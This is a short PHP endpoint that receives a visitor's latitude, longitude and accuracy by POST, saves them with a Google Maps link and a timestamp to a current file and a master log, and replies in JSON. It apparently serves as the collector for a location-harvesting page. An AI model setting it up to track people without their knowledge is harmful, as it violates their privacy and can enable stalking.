<?php
$date = date('dMYHis');
$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';

if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    $data = "📍 Location: " . $latitude . "," . $longitude . "\r\n" .
            "   Accuracy: " . $accuracy . " meters\r\n" .
            "   Maps: https://www.google.com/maps?q=" . $latitude . "," . $longitude . "\r\n" .
            "   Time: " . $date . "\r\n";
    
    $file = 'location_current.txt';
    file_put_contents($file, $data);
    
    // Also save to master log
    if (!is_dir('saved_locations')) {
        mkdir('saved_locations', 0755, true);
    }
    file_put_contents('saved_locations/locations.log', "\n=== New Location ===\n" . $data . "\n", FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Location data received']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing']);
}
exit();
?>
